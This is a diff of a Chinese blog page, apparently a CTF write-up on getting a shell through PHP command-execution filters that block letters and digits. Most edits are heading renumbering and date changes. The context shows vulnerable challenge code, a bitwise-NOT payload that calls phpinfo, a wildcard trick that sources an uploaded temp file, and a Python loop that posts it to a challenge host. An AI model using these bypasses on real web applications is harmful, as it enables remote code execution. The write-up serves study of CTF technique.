@@ -20,15 +20,15 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="无字母数字来getshell的理解例题引入无参数命令执行 ctfshow上的一道无数字字母题使我产生了总结的想法主要是理解p牛的做法。">
+  <meta name="description" content="无字母数字来getshell的理解1 例题引入无参数命令执行 ctfshow上的一道无数字字母题使我产生了总结的想法主要是理解p牛的做法。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="无字母数字webshell">
 <meta property="og:url" content="http://example.com/2022/05/12/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell/index.html">
 <meta property="og:site_name" content="Kabuto">
-<meta property="og:description" content="无字母数字来getshell的理解例题引入无参数命令执行 ctfshow上的一道无数字字母题使我产生了总结的想法主要是理解p牛的做法。">
+<meta property="og:description" content="无字母数字来getshell的理解1 例题引入无参数命令执行 ctfshow上的一道无数字字母题使我产生了总结的想法主要是理解p牛的做法。">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-05-12T03:42:17.000Z">
-<meta property="article:modified_time" content="2022-05-18T14:52:49.197Z">
+<meta property="article:modified_time" content="2022-05-19T09:54:49.540Z">
 <meta property="article:author" content="Kabuto">
 <meta property="article:tag" content="无数字字母">
 <meta name="twitter:card" content="summary">
@@ -196,7 +196,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-05-18 22:52:49" itemprop="dateModified" datetime="2022-05-18T22:52:49+08:00">2022-05-18</time>
+                <time title="Modified: 2022-05-19 17:54:49" itemprop="dateModified" datetime="2022-05-19T17:54:49+08:00">2022-05-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -219,7 +219,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="无字母数字来getshell的理解"><a href="#无字母数字来getshell的理解" class="headerlink" title="无字母数字来getshell的理解"></a>无字母数字来getshell的理解</h1><h2 id="例题引入"><a href="#例题引入" class="headerlink" title="例题引入"></a>例题引入</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kabuto-taka/p/16255542.html">无参数命令执行</a></p>
+        <h1 id="无字母数字来getshell的理解"><a href="#无字母数字来getshell的理解" class="headerlink" title="无字母数字来getshell的理解"></a>无字母数字来getshell的理解</h1><h2 id="1-例题引入"><a href="#1-例题引入" class="headerlink" title="1 例题引入"></a>1 例题引入</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kabuto-taka/p/16255542.html">无参数命令执行</a></p>
 <p>ctfshow上的一道无数字字母题使我产生了总结的想法主要是理解p牛的做法。<span id="more"></span></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -229,7 +229,7 @@
 
 <p>是真正的无数字字母</p>
 <hr>
-<h2 id="php7解法"><a href="#php7解法" class="headerlink" title="php7解法"></a>php7解法</h2><blockquote>
+<h2 id="2-php7解法"><a href="#2-php7解法" class="headerlink" title="2 php7解法"></a>2 php7解法</h2><blockquote>
 <p>PHP7前是不允许用<code>($a)();</code>这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过<code>(&#39;phpinfo&#39;)();</code>来执行函数，第一个括号中可以是任意PHP表达式。</p>
 </blockquote>
 <p><code>&lt;?php (&#39;system&#39;)(&quot;ls&quot;); ?&gt;</code>像这样也可以直接调用</p>
@@ -239,7 +239,7 @@
 
 <p>payload：<code>code=(~%8F%97%8F%96%91%99%90)();</code>在服务器会被解码成(phpinfo)()；执行</p>
 <hr>
-<h2 id="php5解法"><a href="#php5解法" class="headerlink" title="php5解法"></a>php5解法</h2><p>在p牛的文章里php5的版本才用‘.‘来执行任意脚本，点号就和source的作用一样，利用当前的shell执行，等于用source命令。不需要该文件是否有可执行权限。</p>
+<h2 id="3-php5解法"><a href="#3-php5解法" class="headerlink" title="3 php5解法"></a>3 php5解法</h2><p>在p牛的文章里php5的版本才用‘.‘来执行任意脚本，点号就和source的作用一样，利用当前的shell执行，等于用source命令。不需要该文件是否有可执行权限。</p>
 <p>所以我们就可以发送一个文件的post包此时php会把文件临时保存到临时文件夹下，默认是&#x2F;tmp&#x2F;phpXXXXXX,但是很难锁定 &#x2F;???&#x2F;????????? 因为有很多这样的文件，</p>
 <p><a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/glob.7.html">linux通配符文档</a></p>
 <p>了解关于通配符的知识</p>
@@ -254,11 +254,10 @@
 </blockquote>
 <p>所以在最后一位加上范围多试几次就能get到</p>
 <p>如何解题不重要重要的是，这次解法的思想</p>
-<h2 id="练手"><a href="#练手" class="headerlink" title="练手"></a>练手</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="4-练手"><a href="#4-练手" class="headerlink" title="4 练手"></a>4 练手</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://5f299eda-1eed-42cd-9157-df16010d4afe.challenge.ctf.show//?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;tk.txt&#x27;</span>, <span class="string">b&#x27;ls&#x27;</span>)&#125;)</span><br><span class="line">    <span class="comment">#if r.text.find(&quot;flag&quot;) &gt; 0:</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="comment">#break</span></span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>![image-20220512155753385](无字母数字webshell\屏幕截图 2022-05-12 155735.png)</p>
 
     </div>
 
@@ -278,8 +277,8 @@
     <div class="post-nav">
       <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2022/05/13/%E8%AE%BE%E8%AE%A1go%E7%9A%84web%E6%A1%86%E6%9E%B6/" rel="next" title="设计go的web框架">
-      设计go的web框架 <i class="fa fa-chevron-right"></i>
+    <a href="/2022/05/13/%E8%AE%BE%E8%AE%A1go%E7%9A%84web%E6%A1%86%E6%9E%B6/" rel="next" title="go web框架设计（1,2）">
+      go web框架设计（1,2） <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -339,7 +338,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9D%A5getshell%E7%9A%84%E7%90%86%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">无字母数字来getshell的理解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E5%BC%95%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">例题引入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php7%E8%A7%A3%E6%B3%95"><span class="nav-number">1.2.</span> <span class="nav-text">php7解法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php5%E8%A7%A3%E6%B3%95"><span class="nav-number">1.3.</span> <span class="nav-text">php5解法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%83%E6%89%8B"><span class="nav-number">1.4.</span> <span class="nav-text">练手</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9D%A5getshell%E7%9A%84%E7%90%86%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">无字母数字来getshell的理解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BE%8B%E9%A2%98%E5%BC%95%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">1 例题引入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-php7%E8%A7%A3%E6%B3%95"><span class="nav-number">1.2.</span> <span class="nav-text">2 php7解法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-php5%E8%A7%A3%E6%B3%95"><span class="nav-number">1.3.</span> <span class="nav-text">3 php5解法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E7%BB%83%E6%89%8B"><span class="nav-number">1.4.</span> <span class="nav-text">4 练手</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
